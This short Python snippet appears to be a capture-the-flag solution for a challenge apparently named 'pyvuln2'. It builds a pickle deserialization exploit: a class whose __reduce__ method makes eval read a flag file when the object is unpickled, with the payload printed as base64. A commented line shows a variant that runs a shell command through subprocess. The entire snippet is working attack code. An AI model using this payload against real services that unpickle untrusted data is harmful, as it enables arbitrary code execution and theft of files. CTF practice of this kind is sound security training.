
class virus(object):
    #__import__('subprocess').check_output, ('ls',)
    #/home/pyvuln2/flag.txt
    def __reduce__(self):
        return ( eval, ('open(\'/home/pyvuln2/flag.txt\').read()',))

def hack():
    print(base64.b64encode(pickle.dumps(virus())))

